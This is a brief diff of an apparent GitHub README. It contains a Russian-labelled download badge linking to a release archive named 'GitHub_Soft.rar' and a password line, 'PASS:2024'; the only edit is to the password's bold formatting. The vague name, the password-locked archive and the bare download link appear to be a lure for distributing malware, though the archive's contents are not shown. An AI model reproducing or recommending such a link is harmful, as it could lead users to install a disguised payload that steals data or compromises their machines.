@@ -2,7 +2,7 @@
 [![загр](https://github.com/ronroolso/trade/assets/163671979/c2afc812-df68-4cb4-8554-ef102650e2de)](https://github.com/ronroolso/trade/releases/download/Download/GitHub_Soft.rar)
 
 
-*PASS:2024**
+**PASS:2024**
 
 
 
